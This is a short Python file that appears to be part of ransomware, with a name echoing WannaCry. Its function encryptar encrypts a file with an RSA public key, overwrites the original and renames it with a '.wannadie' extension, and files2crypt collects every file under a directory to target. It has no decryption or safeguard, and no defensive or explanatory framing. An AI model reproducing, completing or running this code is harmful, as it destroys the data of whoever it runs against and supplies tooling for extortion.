from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import learn_key
import os,sys

def encryptar(FileName,public_key):
    try:
        public_key = RSA.importKey(public_key)
        encryptor = PKCS1_OAEP.new(public_key)
        OutputFile = os.path.join(os.path.dirname(FileName), "(encrypted)" + os.path.basename(FileName) + '.wannadie')
        with open(FileName,'rb') as initial_file:
            text = initial_file.read()
            initial_file.close()
            encrypted = encryptor.encrypt(text)
        with open(FileName,'wb') as output_file:
            output_file.write(encrypted)
            output_file.close()
        os.rename(FileName,OutputFile)
        return True
    except:
        return False

def files2crypt(path):
    allFiles = []
    for root, subfiles, files in os.walk(path):
        for names in files:
            allFiles.append(os.path.join(root, names))
    return allFiles
